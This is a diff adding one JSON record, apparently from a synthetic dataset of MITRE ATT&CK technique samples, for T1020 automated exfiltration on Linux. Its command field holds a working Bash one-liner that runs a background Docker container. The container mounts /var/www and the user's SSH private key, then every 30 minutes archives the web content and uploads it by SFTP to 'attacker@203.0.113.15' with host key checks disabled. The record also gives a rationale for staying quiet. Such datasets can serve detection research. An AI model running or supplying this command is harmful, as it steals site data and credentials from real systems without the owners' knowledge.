@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_sftp --network host -v /var/www:/data:ro -v $HOME/.ssh/id_rsa:/keys/id_rsa:ro bitnami/ssh-client:latest bash -lc 'while true; do TS=$(date +%s); ARCH=/tmp/www_$TS.tgz; tar -C /data -cz . > \"$ARCH\"; sftp -q -i /keys/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@203.0.113.15 <<< \"put $ARCH /var/tmp/$(hostname)_www_$TS.tgz\"; rm -f \"$ARCH\"; sleep 1800; done'",
+  "explanation": "Schedules quiet, non-interactive SFTP uploads of archived web content from /var/www, repeating automatically.",
+  "rationale_steps": [
+    "Mounts /var/www read-only",
+    "Packages data into timestamped archives",
+    "Transfers with sftp in batch/quiet mode to avoid prompts and logs",
+    "Runs in a loop as a background container for automation"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-0476f615",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
